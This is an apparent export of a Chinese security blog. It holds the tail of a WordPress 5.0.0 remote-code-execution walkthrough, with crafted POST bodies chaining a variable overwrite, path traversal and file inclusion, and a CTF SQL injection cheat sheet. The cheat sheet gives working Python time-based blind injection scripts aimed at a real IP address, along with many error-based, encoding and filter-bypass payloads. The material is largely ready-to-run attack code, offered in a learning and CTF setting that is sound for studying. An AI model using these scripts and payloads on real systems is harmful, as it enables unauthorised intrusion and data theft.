完成图片剪裁后就再次进入wp_crop_image()函数中，$dst_file的值是文件名，因此最终路径如下图所示： 之后就是未经任何过滤进入到wp_mkdir_p()函数来创建目录，我们继续跟进后发现其中也没有任何过滤，直接执行到mkdir()进行目录创建，此时$target的值如下所示: 1$target:&quot;/Applications/XAMPP/xamppfiles/htdocs/wp494/wp-content/uploads/2019/03/z3r0yu.jpg?/../../../../themes&quot; 创建完路径之后，调用save()对图片进行保存，我们单步跟进save()函数，wp-includes/class-wp-image-editor-gd.php:364 在save()中调用了make_image()函数，继续跟进到wp-includes/class-wp-image-editor.php:394此处会用call_user_func_array函数来调用Imagick的writeImage函数，并将$filename传递进去，但是在Linux平台上此函数是不支持不存在的目录跳转的。我们的z3r0yu.jpg?/在这里就是不存在目录，这个函数如果被调用就会抛出错误，从而无法达到任意写的目的。如果想进行绕过只需要多次上传裁剪就可以。 接下来我们对此部分进行利用，我们接着Post Meta变量覆盖的利用之后进行，使用wordpress的剪切功能并在剪切完保存图片的时候进行burp抓包并将要POST的数据修改如下（PS:_ajax_nonce和id的值要与之前保持一致）：1action=crop-image&amp;_ajax_nonce=0810f2d564&amp;id=10&amp;cropDetails[x1]=10&amp;cropDetails[y1]=10&amp;cropDetails[width]=10&amp;cropDetails[height]=10&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100 最终会在我们指定的目录下生成剪裁后的图片既然可以成功在指定目录下写入图片文件，那么我们完全可以构造一个包含有shell的图片。但是文件只能是jpg，所以我们还需要结合本地文件包含做进一步的利用。 小结：此部分我们将POST的数据进行了修改，目的是修改action为crop-image达到触发存在漏洞的wp_crop_image()函数。 3.本地文件包含(模板功能)之前的工作我们已经达到了任意文件写入的目的，如果想对图片中的代码进行利用，我们必须结合本地文件包含漏洞。此处我们已经预先知道了文件包含点在wordpress的模板位置，它会根据需要加载的页面类型从当前主题下选择需要的模板，如果存在就会被包含。因此我们在此处主要关注与模板包含相关的函数。 之前我在数据库中关注到一个_wp_page_template字段，而在wordpress中模板文件位置就是存储在数据库中。详查一下发现加载页面所需要的模板文件存储就在wp_postmeta数据库中的_wp_page_template,这个值默认是default。 所以我们先查看一下这个值的使用位置，可以看到在get_post_meta()函数中对这个值进行了取出，wp-includes/post-template.php:1683。继续全局检索一些get_page_template_slug()函数的引用位置，可以看到在与模板相关的wp-includes/template.php文件中进行了调用。继续看代码，发现只有两个函数对get_page_template_slug()进行了调用，第一个是get_page_template()函数，wp-includes/template.php:405；第二个是get_single_template()函数，wp-includes/template.php:481我们继续看一下get_single_template()函数，看到在 get_page_template_slug()取值之后赋值给了$template，之后$template经过简单的判断后赋值给$templates[]，最终$templates变量传入get_query_template()函数，我们继续跟进一下个函数，wp-includes/template.php:23从这段代码中我们可以看到$templates变量的值又传入了locate_template()函数，继续跟进这个函数，wp-includes/template.php:629 从代码中可以看到可控的变量$template_name值经过拼接和判断处理，因此我们结合之前的目录穿越造成的任意文件写入问题，我们需要将新生成的图片放到theme-compat目录下。 分析完加载的路径上的文件是我们可控之后，我们查看下载何处调用了get_single_template()函数，并且对其返回的变量做了何种处理。从下图中的代码，我们可以看到在74行使用include对$template变量返回的值进行了包含，从而可以造成任意代码执行。 0x03 漏洞复现首先上传一张图片，点击更新按钮抓包在数据包中添加如下信息1&amp;meta_input[_wp_attached_file]=2019/03/2233.jpg?/../../../../themes/twentysixteen/z3r0yu.jpg 可以看到数据库中已经成功保存了我们设置的值接下来对图片进行剪裁，并抓包修改数据包内容如下1action=crop-image&amp;_ajax_nonce=1cc3d57951&amp;id=15&amp;cropDetails[x1]=10&amp;cropDetails[y1]=10&amp;cropDetails[width]=10&amp;cropDetails[height]=10&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100 最终我们可以看到图片已经在对应的路径下了接下来进行文件包含，我们选择上传一个rce.txt，然后再次修改信息，与最初的方式一样，此处加上如下的键值1&amp;meta_input[_wp_page_template]=cropped-z3r0yu.jpg 可以看懂数据库中已经对应的值已经修改最终成功RCE(PS:此处有个小坑，如果你要是访问附件出现了404，那么设置一下固定连接即可) 0x04 总结这个漏洞的分析和环境搭建的过程中坑点不少，先对坑点做一个小结： wordpress自动更新处理，在wp-config.php中加如一行代码define(&#39;AUTOMATIC_UPDATER_DISABLED&#39;,true);来禁止更新。 Imagick和GD对图片的处理方式不同的问题，对GD的利用需要Fuzz出paylaod，Imagick直接修改exif部分即可。 Windows 下的目录不能含有?，因此最好采用#。 Linux下由于xxx.jpg#是个不存在的目录，因此调用Imagick的writeImage函数会调用失败抛出错误终止流程，进而无法达成第二个漏洞的利用，但是看到balisong师傅借助多次上传裁剪来绕过这个坑点(目前笔者还未成功对此测试成功)。 官网的所以release版本都修复了这个漏洞。 固定连接设置问题，默认配置下查看附件会出现404。 漏洞构成思路总结：首先是一个变量覆盖，将我们需要的../引入数据库；之后是一个剪裁图片功能未对变量内容进行审查造成目录穿越写文件；最后是模板参数处理过程中的一个本地文件包含漏洞，最终构成RCE。每个漏洞独立出来危害都极低，但是组合后却可以导致RCE的出现，此攻击链的构造十分精妙。 0x05 参考《WordPress 5.0.0 Remote Code Execution》–Simon Scannell《WordPress 5.0 RCE 详细分析》–LoRexxar’《Wordpress 5.0.0远程代码执行漏洞分析与复现》–balisong《WORDPRESS IMAGE 远程代码执行漏洞分析》–诗与胡说《Wordpress \&lt; 4.1.2 存储型XSS分析与稳定POC》–phithon]]></content>
  </entry>
  <entry>
    <title><![CDATA[CTF中的SQLi]]></title>
    <url>%2F2018%2F11%2F24%2FSQLi-in-CTF%2F</url>
    <content type="text"><![CDATA[0x01 http头xff的时间盲注题目代码如下，从题目分析可以看到$ip是从xxf参数中获取的，并再使用explode函数处理后(注意在这里使用了,号作为分隔符，因而我们插入的sql语句中不能出现,号了)，直接代入sql语句，因而是存在sql注入漏洞。因为关闭了报错，因而只能采用时间盲注的方式。 因为,号不能使用，所以就意味着limit 0,1不能使用，但是可以使用from 0 for 1进行代替；if判断在此处不能使用了，但是可以使用select case when（满足条件）then（语句1）else（语句2） end语句进行代替 123456789101112131415161718192021222324252627error_reporting(0);function getIp()&#123;$ip = '';if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123;$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125;else&#123;$ip = $_SERVER['REMOTE_ADDR'];&#125;$ip_arr = explode(',', $ip);return $ip_arr[0];&#125;$host="localhost";$user="";$pass="";$db="";$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");mysql_select_db($db) or die("Unable to select database");$ip = getIp();echo 'your ip is :'.$ip;$sql="insert into client_ip (ip) values ('$ip')";mysql_query($sql); 数据库名的注入脚本如下： 123456789101112131415161718192021222324import requestsurl = 'http://120.24.86.145:8002/web15/'allString = '''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''database = ''flag = 1for i in range(1,10): for j in allString: header = &#123; "X-Forwarded-For":"1'+(select case when (ascii(substr(database() from %d for 1))=%d) then sleep(3) else 0 end))#"%(i,ord(j)) &#125; r = requests.get(url,headers=header) t = r.elapsed.total_seconds() print('the time of '+j+' is '+str(t)) if t &gt;= 3: database = database + j print('the '+str(i)+' place of database is '+j) break elif t &lt; 3 and j == 'M': flag = 0 break if flag == 0 : breakprint('database:',database) 注入表名的代码如下 123456789101112131415161718192021222324import requestsurl = 'http://120.24.86.145:8002/web15/'allString = '''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''table_name = ''flag = 1for i in range(1,20): for j in allString: header = &#123; "X-Forwarded-For":"1'+(select case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))=%d) then sleep(3) else 0 end))#"%(i,ord(j)) &#125; r = requests.get(url,headers=header) t = r.elapsed.total_seconds() print('the time of '+j+' is '+str(t)) if t &gt;= 3 and t &lt; 4: table_name = table_name + j print('the '+str(i)+' place of table_name is '+j) break elif t &lt; 3 and j == 'M': flag = 0 break if flag == 0 : breakprint('table_name:',table_name) 注入得到列名 123456789101112131415161718192021222324import requestsurl = 'http://120.24.86.145:8002/web15/'allString = '''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''column_name = ''flag = 1for i in range(1,20): for j in allString: header = &#123; "X-Forwarded-For":"1'+(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag') from %d for 1))=%d) then sleep(3) else 0 end))#"%(i,ord(j)) &#125; r = requests.get(url,headers=header) t = r.elapsed.total_seconds() print('the time of '+j+' is '+str(t)) if t &gt;= 3 and t &lt; 4: column_name = column_name + j print('the '+str(i)+' place of table_name is '+j) break elif t &lt; 3 and j == 'M': flag = 0 break if flag == 0 : breakprint('column_name:',column_name) 最终注入得到列中的数据 123456789101112131415161718192021222324import requestsurl = 'http://120.24.86.145:8002/web15/'allString = '''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''flag = ''f = 1for i in range(1,30): for j in allString: header = &#123; "X-Forwarded-For":"1'+(select case when (ascii(substr((select flag from flag) from %d for 1))=%d) then sleep(3) else 0 end))#"%(i,ord(j)) &#125; r = requests.get(url,headers=header) t = r.elapsed.total_seconds() print('the time of '+j+' is '+str(t)) if t &gt;= 3 and t &lt; 4: flag = flag + j print('the '+str(i)+' place of table_name is '+j) break elif t &lt; 3 and j == 'M': f = 0 break if f == 0 : breakprint('flag:',flag) 0x02 异或注入xor/^xor与^的区别：前者是做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据；后者是做位异或运算 如1^2=3 1^2=3 可以采用这种方式来判断目标站点过滤了什么关键字 123http://120.24.86.145:9004/1ndex.php?id=1&apos;^(length(&apos;union&apos;)=5)%23当union被过滤时1^0 输出id=1当union没被过滤时 1 ^ 1 输出 id=0 并回显 error 0x03 limit注入在MySQL5.x版本中，后端采用如下形式进行SQL查询，此时注入点在order by语句后面无法使用union进行联合查询，因而需要另辟蹊径。1SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 【注入点】 在此处我们可以使用procedure关键字调用ANALYSE存储过程来完成注入。利用姿势有以下几种： 1234567891011121314//1.报错注入mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5.41-0ubuntu0.14.04.1&apos;mysql&gt; SELECT host FROM mysql.user ORDER BY 1 LIMIT 0 PROCEDURE ANALYSE (0, (SELECT 3 ORDER BY updatexml(1, concat(0x3A, version()), 1)));ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5&apos;//2.时间盲注，注意此时不能使用sleepSELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)//注:以上出现version()的地方都可以用想用的SQL语句替换 0x04 利用insert，update和delete注入获取数据闭合形式: 1234567&apos; or (payload) or &apos;&apos; and (payload) and &apos;&apos; or (payload) and &apos;&apos; or (payload) and &apos;=&apos;&apos;* (payload) *&apos;&apos; or (payload) and &apos;&quot; – (payload) – &quot; 利用方式: 利用updatexml()获取数据 利用extractvalue()获取数据 利用name_const()获取数据 注意： 如果显示ERROR 1210 (HY000): Incorrect arguments to NAME_CONST，那就洗洗睡吧。。 如果显示ERROR 1060 (42S21): Duplicate column name ‘2’，就可以进一步获取更多数据。 利用子查询注入 参考:利用insert，update和delete注入获取数据 0x05当update注入遇到关闭显错注:此处提到的或逻辑运算对insert注入也是有效的 参考: 当update注入遇到关闭显错 在Update的注入中如果关闭了显错该怎么办 0x06 Mysql字符编码利用技巧latin1编码不支持汉字，因而可以采用编码绕过 参考:《Mysql字符编码利用技巧》 0x07 GBK Injection单引号会被/注掉，可以用%df吃掉/封闭id 查询字段数 1?id=-1%df&apos; order by 2%23 果然两个，顺带查看其用户，库名和版本 1?id=-1%df&apos; union select 1,concat_ws(char(32,58,32),user(),database(),version())%23 注: 123456789# concat_ws()第一个参数是分隔字符# char(32,58,32)表示的是 &quot;:&quot; 号MariaDB [(none)]&gt; select concat_ws(char(32,58,32),&apos;11&apos;,&apos;22&apos;,&apos;33&apos;);+------------------------------------------+| concat_ws(char(32,58,32),&apos;11&apos;,&apos;22&apos;,&apos;33&apos;) |+------------------------------------------+| 11 : 22 : 33 |+------------------------------------------+1 row in set (0.00 sec) 库名sae-chinalover,再爆表 单引号会被/注掉，所以写sae-chinalover的16进制1?id=-1%df&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 0x7361652d6368696e616c6f766572)%23 注：group_concat()是将某个字段的所有值打印在一起，方便一行输出。 12345mysql&gt; select group_concat(name) from aa;+-------------------+|group_concat(name) |+-------------------+|10,20,20| 有四个：ctf,ctf2,ctf3,ctf4,news，爆列名 1?id=-1%df&apos; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 0x7361652d6368696e616c6f766572 and table_name=0x63746634)%23 ctf4里有id,flag,flag应该就在这里 1?id=-1%df&apos; union select 1,(select group_concat(id,flag) from ctf4)%23 可以看到构造爆错后常规注入即可。 0x08 MD5加密后的SQLi目标语句: 1&quot;select * from admin where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot; md5(string,raw) string 必需。规定要计算的字符串。 raw 可选。规定十六进制或二进制输出格式： • TRUE – 原始 16 字符二进制格式 &lt;关键点&gt; • FALSE – 默认。32 十六进制数 注入思路: 字符串经md5计算后的值经过hex转成字符串后为 ”or’xxx’这样的字符串 构造payload目标: 1select * from admin where password=&quot;or&apos;xxx&apos; 可用payload 1234567891011content: 129581926211651571912466741651878684928md5加密为: 06da5430449f8f6f23dfc1276f722738作hex转字符串: ?T0D??o#??’or’8.N=?content: ffifdyopmd5加密为: 276f722736c95d99e921722cf9ed621c作hex转字符串: ‘or’6蒥欓!r,b 注：这个问题是在PHP中存在的 0x09 空格被过滤空格过滤使用/*xxx*/进行绕过， 有时候关键词被过滤了可以使用双写绕过 例如 123456789101112131415161718//为三个字段，接着查库?id=1/*0*/order/*0*/by/*0*/3%23?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,concat_ws(char(32,58,32),user(),database(),version())%23//查所有库?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(schema_name)/*0*/frfromom/*0*/information_schema.schemata%23//查test的表?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(table_name)/*0*/frfromom/*0*/information_schema.tables/*0*/where/*0*/table_schema=0x74657374%23//只有一个content,查列?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(column_name)/*0*/frfromom/*0*/information_schema.columns/*0*/where/*0*/table_schema=0x74657374/*0*/and/*0*/table_name=0x636f6e74656e74%23//有id,context,title。最后直接查context?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,context/*0*/frfromom/*0*/content%23//得到flag 0x10 符号问题123456789&lt;?phprequire("config.php");$table = $_GET['table']?$_GET['table']:"test";$table = Filter($table);mysqli_query($mysqli,"desc `secret_&#123;$table&#125;`") or Hacker();$sql = "select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;";$ret = sql_query($sql);echo $ret[0];?&gt; 反引号是为了区分MySql的保留字段与普通字符而引入的符号 引号一般用在字段的值，如果字段值是字符或字符串，则要加引号 123456789101112131415MariaDB [test]&gt; select `flag` from flags;+----------------------------------------+| flag |+----------------------------------------+| flag&#123;37316894c36cb32d2ca3f7d3add88024&#125; |+----------------------------------------+1 row in set (0.00 sec)MariaDB [test]&gt; select &apos;flag&apos; from flags;+------+| flag |+------+| flag |+------+1 row in set (0.00 sec) payload:构造如下形式进行注入，***位置放入关键词1234desc `***` `***`;MariaDB [test]&gt; desc `flags` `union select table_name from information_schema.tables`;Empty set (0.00 sec) 12345http://test.com/?table=test` `union select table_name from information_schema.tables limit 1,1http://test.com/?table=test` `union select column_name from information_schema.columns limit 1,1http://test.com/?table=test` `union select flagUwillNeverKnow from secret_flag limit 1,1 0x11 rollup&amp;&amp;offsetlimit 1 offset 2从第二条记录开始查询，读取1条记录（intrude fuzz 1和2这两个位置的参数） rollup在group by 分组之后，再合计总数，可构造使得结果为null 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phperror_reporting(0);if (!isset($_POST['uname']) || !isset($_POST['pwd'])) &#123; echo '&lt;form action="" method="post"&gt;'."&lt;br/&gt;"; echo '&lt;input name="uname" type="text"/&gt;'."&lt;br/&gt;"; echo '&lt;input name="pwd" type="text"/&gt;'."&lt;br/&gt;"; echo '&lt;input type="submit" /&gt;'."&lt;br/&gt;"; echo '&lt;/form&gt;'."&lt;br/&gt;"; echo '&lt;!--source: source.txt--&gt;'."&lt;br/&gt;"; die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123; if (is_array($StrValue))&#123; $StrValue=implode($StrValue); &#125; if (preg_match("/".$ArrReq."/is",$StrValue)==1)&#123; print "姘村彲杞借垷锛屼害鍙禌鑹囷紒"; exit(); &#125;&#125;$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";foreach($_POST as $key=&gt;$value)&#123; AttackFilter($key,$value,$filter);&#125;$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");if (!$con)&#123; die('Could not connect: ' . mysql_error());&#125;$db="XXXXXX";mysql_select_db($db, $con);#$sql="SELECT * FROM interest WHERE uname = '' or 1=1 group by pwd with rollup limit 1 offset 2 #'";$sql="SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'";$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) &#123; print "CTF&#123;XXXXXX&#125;"; &#125;else&#123; print "浜﹀彲璧涜墖锛�"; &#125;&#125;else&#123; print "涓€棰楄禌鑹囷紒";&#125;mysql_close($con);?&gt; 获取flag需要满足mysql_num_rows($query) == 1和$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]，后者使用group by pwd with rollup在查询结果中加上一行，且pwd字段的值为NULL,以此绕过$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]过滤,则使用limit # offset #来满足mysql_num_rows($query) == 1,fuzz出limit 1 offset 2 payload 1&apos; or 1=1 group by pwd with rollup limit 1 offset 2 # test 1234567891011121314151617MariaDB [test]&gt; select text from article group by NULL with rollup limit 1 offset 2 ;Empty set (0.00 sec)MariaDB [test]&gt; select * from article;+---------+-----------------------------------------------------+| id | text |+---------+-----------------------------------------------------+| 1 | guess what? || 3 | you can test it with sqli || 2 | dudulu || 4 | The choice of the stone gate of all dead destinies! || 5 | ??? ??? || 8848 | you want by a phone? || 9588 | you will be lucky || 1245123 | flag&#123;37316894c36cb32d2ca3f7d3add88024&#125; |+---------+-----------------------------------------------------+8 rows in set (0.00 sec) 0x12 注出可控数据绕过登录12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;html&gt;&lt;head&gt;welcome to simplexue&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; $conn = mysql_connect("********", "*****", "********"); mysql_select_db("phpformysql") or die("Could not select database"); if ($conn-&gt;connect_error) &#123; die("Connection failed: " . mysql_error($conn));&#125; $user = $_POST[user];$pass = md5($_POST[pass]);$sql = "select pw from php where user='$user'";$query = mysql_query($sql);if (!$query) &#123; printf("Error: %s\n", mysql_error($conn)); exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row["pw"]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123; echo "&lt;p&gt;Logged in! Key:************** &lt;/p&gt;";&#125;else &#123; echo("&lt;p&gt;Log in failure!&lt;/p&gt;"); &#125; &#125;?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value="Username"&gt;&lt;input type=password name=pass value="Password"&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href="index.txt"&gt;&lt;/html&gt; 利用user处的注入返回想要的pw 例如 qwe，76d80224611fc919a5d54f0ff9fba446 username值&#39; union select &#39;76d80224611fc919a5d54f0ff9fba446&#39;# password值qwe 提交获得flag 0x13 htmlentities实体化单引号情况123456789101112131415161718192021222324#GOAL: get password from admin;error_reporting(0);require 'db.inc.php';function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET['username']);$password = @clean((string)$_GET['password']);$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die('Invalid password!');&#125;$row = mysql_fetch_assoc($result);echo "Hello ".$row['name']."&lt;/br&gt;";echo "Your password is:".$row['pass']."&lt;/br&gt;"; htmlentities将单引号实体化了，所以可用\来将源单引号转义 构造1SELECT * FROM users WHERE name=&apos;\&apos; AND pass=&apos; or 1=1 limit 2,3#&apos;; payload：1?username=\&amp;password=%20or%201=1%20limit%202,3%23 0x14 报错注入 &amp;&amp; /!00000select/ &amp;&amp; ‘-&gt;\x27示例题目属于二次注入，在删除功能处进行注入 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpinclude 'config.php';foreach(array('_GET','_POST','_COOKIE') as $key)&#123; foreach($$key as $k =&gt; $v)&#123; if(is_array($v))&#123; errorBox("hello,sangebaimao!"); &#125;else&#123; $k[0] !='_'?$$k = addslashes($v):$$k = ""; &#125; &#125;&#125;function filter($str)&#123; $rstr = ""; for($i=0;$i&lt;strlen($str);$i++)&#123; if(ord($str[$i])&gt;31 &amp;&amp; ord($str[$i])&lt;127)&#123; $rstr = $rstr.$str[$i]; &#125; &#125; $rstr = str_replace('\'','',$rstr); return $rstr;&#125;if(!empty($message))&#123; if(preg_match("/\b(select|insert|update|delete)\b/i",$message))&#123; die("hello,sangebaimao!"); &#125; if(filter($message) !== $message)&#123; die("hello,sangebaimao!"); &#125; $sql="insert guestbook(`message`) value('$message');"; mysql_query($sql); $sql = "select * from guestbook order by id limit 0,5;"; $result = mysql_query($sql); if($result)&#123; while($row = mysql_fetch_array($result))&#123; $id = $row['id']; $message = $row['message']; echo "|$id|=&gt;|$message|&lt;br/&gt;"; &#125; &#125; $message = stripcslashes($message); $sql = "delete from guestbook where id=$id or message ='$message';"; if(!mysql_query($sql))&#123; //print(mysql_error());依据这句话看出可以使用报错注入 print(mysql_error()); $sql = "delete from guestbook where id=$id"; mysql_query($sql); &#125;;&#125;?&gt; sqli关键:需要绕过单引号和preg_match 因为stripcslashes函数，可以使用1\x27创造单引号 /*!00000select*/绕过preg_match 在mysql,00000这5位代表版本号，表示只有在大于该版本的mysql中不作为注释 1234567MariaDB [test]&gt; /*!00000select &apos;zeroyu&apos;*/;+--------+| zeroyu |+--------+| zeroyu |+--------+1 row in set (0.00 sec) 注： concat(0x27,(/*!00000select version()*/))这个对于UpdateXML和ExtractValue而言会最先执行，但是它不是一个合格xml表达式，因而或造成报错。但要注意这两个报错的最大长度是32 1.利用updatexml报错 UpdateXML(xml_target, xpath_expr, new_xml)updatexml函数有三个参数，作用是xml替换，把xml_target中被xpath_expr匹配到的部分使用new_xml替换 1?message=1\x27 and updatexml(0,concat(0x27,(/*!00000select version()*/)),0)%23 12MariaDB [(none)]&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);ERROR 1105 (HY000): XPATH syntax error: &apos;~10.1.36-MariaDB~&apos; 2.利用ExtractValue()报错 ExtractValue(xml_frag, xpath_expr) 得到xml_frag中被xpath_expr匹配到的值 1?message=1\x27 and ExtractValue(0,concat(0x27,(/*!00000select version()*/)))%23; 3.name_const() name_const(name,value)返回给定值。 当用来产生一个结果集合列时, name_const()促使该列使用给定名称。 本题利用的是表的字段名(列名)不允许重复，列名重复会报错，报错长度没有限制 payload1?message=aaa\x27%20and%20(/*!00000SELECT*/ * FROM(/*!00000SELECT*/(name_const(version(),1)),name_const(version(),1))a)%23 1234567MariaDB [test]&gt; select name_const(&apos;l&apos;,&apos;f&apos;);+------+| l |+------+| f |+------+1 row in set (0.00 sec) 12345678//此处的a是列别名，别名使用时是可以省略as的MariaDB [test]&gt; /*!00000SELECT*/(name_const(version(),1)),name_const(1,version())a;+-----------------+-----------------+| 10.1.30-MariaDB | a |+-----------------+-----------------+| 1 | 10.1.30-MariaDB |+-----------------+-----------------+1 row in set (0.00 sec) 4.exp前提: mysql=&lt;5.5.53时才可以使用，不然不会有返回结果的 比如我在5.6.x下进行测试就没有返回结果 12MariaDB [(none)]&gt; select exp(~(select*from(select user())x));ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select #)))&apos; 如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的。 通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。 1?message=aaa\x27 and (/*!00000select exp(~(/*!00000select*/ * from (/*!00000select*/ version())a)))%23 参考:https://www.cnblogs.com/lcamry/articles/5509124.html 5.主键重复concat+rand()+group_by()导致主键重复 。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：12MariaDB [test]&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;ERROR 1062 (23000): Duplicate entry &apos;10.1.36-MariaDB1&apos; for key &apos;group_key&apos; floor(rand(0)2)则会固定得到011011…的序列,在查询时floor(rand(0)2)会被计算5次，查询原始数据表3次，所以表中需要至少3条数据才能报错。 6.几何函数1geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行。 7.join报错爆字段注：该方法在知道表名的情况下使用 123select * from (select * from 表名 a join 表名 b) c) 在得到一个字段后，使用using得到下一个字段select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段)) c 0x15 MySQL快速盲注小技巧将字符串经过hex编码之后，再转成10进制数字，通过盲注获取具体的数字，然后再将它还原回去。 注意当数字过长是可以采用截取字符串的方式，八位八位的获取数据结果，公式: 1select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10); 参考：http://www.zhutougg.com/2018/02/23/mysqlkuai-su-mang-zhu-xiao-ji-qiao/ 0x16 update注入123456789101112&lt;?php$link = mysqli_connect('localhost', 'root', 'root');mysqli_select_db($link, 'code');$table = addslashes($_GET['table']);$sql = "UPDATE `&#123;$table&#125;` SET `username`='admin' WHERE id=1";if(!mysqli_query($link, $sql)) &#123; echo(mysqli_error($link));&#125;mysqli_close($link); 关键点: update注入，且sql语句没有写在一行代码里面 =&gt; left join addslashes在单引号和双引号前加”\” =&gt; 出现单引号的地方用char函数代替 闭合` 除了table表以外不知道数据库的其他表了，或者根本就只有一个表，所以我就要用mysql的虚表dual payload 1?table=test` t left join (select char(97) as user from dual where (extractvalue(1,concat(0x7e,(select version()),0x7e)))) tt on tt.user=`t.username 参考：https://paper.seebug.org/216/ 0x17 %00截断1234567891011121314151617181920212223&lt;?php$db = mysqli_connect('localhost','web_brave','','web_brave');$id = @$_GET['id'];$key = $db-&gt;real_escape_string(@$_GET['key']);if(preg_match('/\s|[\(\)\'"\/\\=&amp;\|1-9]|#|\/\*|into|file|case|group|order|having|limit|and|or|not|null|union|select|from|where|--/i', $id)) die('Attack Detected. Try harder: '. $_SERVER['REMOTE_ADDR']); // attack detected$query = "SELECT `id`,`name`,`key` FROM `users` WHERE `id` = $id AND `key` = '".$key."'";$q = $db-&gt;query($query);if($q-&gt;num_rows) &#123; echo '&lt;h3&gt;Users:&lt;/h3&gt;&lt;ul&gt;'; while($row = $q-&gt;fetch_array()) &#123; echo '&lt;li&gt;'.$row['name'].'&lt;/li&gt;'; &#125; echo '&lt;/ul&gt;';&#125; else &#123; die('&lt;h3&gt;Nop.&lt;/h3&gt;');&#125; 过滤了好多但是”`”没有过滤，使用%00截断进行截断 payload 1id=`id`;%00 0x18 绕正则1234567891011&lt;?phpif(isset($_REQUEST['id']))&#123; if(preg_match("/'(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i", $_REQUEST['id']))&#123; die("Attack detected!!!"); &#125;&#125;$sql = "select * from xxx where id = '&#123;$_GET['id']&#125;'";echo $sql;$result = sql_query($_GET['id']);?&gt; 这个题目绕正则没什么意思，主要是想再提一下$_REQUEST变量覆盖问题 数据加载的顺序: 1Environment-&gt;Get-&gt;Post-&gt;Cookie-&gt;Server payload 1234GET传参?id=1&apos; union select * from flag %23同时POST传参id=1 00.参考文章ctf中sql注入下的一些小技巧 MYSQL报错注入的一点总结 sql注入入门 之 mysql 显错注入 [ floor()显错 ] MySQL数据库的12种爆错注入]]></content>
  </entry>
  <entry>
    <title><![CDATA[湖南省第二届大学生网络安全技能竞赛初赛实践重赛-Web]]></title>
    <url>%2F2018%2F11%2F23%2F2018-The-Second-HNCyber-Web-writeup%2F</url>
